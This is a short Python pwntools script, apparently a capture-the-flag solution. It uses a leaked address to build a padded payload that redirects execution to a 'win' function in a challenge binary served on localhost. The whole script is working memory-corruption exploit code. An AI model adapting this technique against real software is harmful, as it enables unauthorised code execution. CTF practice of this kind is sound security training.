from pwn import *
elf = context.binary = ELF("chal")
p = remote("localhost", 8000) #process()
win = elf.sym["_Z3winv"]
p.sendlineafter(b": ", b"5")
p.recvuntil(b"address for you: ")
addr = int(p.recvline().strip(), 16) + 5 + 80 - 16 - 1
payload = flat(
    0,
    win,
    addr,
    addr + 8
).rjust(80 - 1, b"A")
p.clean(timeout = 0.2)
p.sendline(payload)
print(p.readline().decode())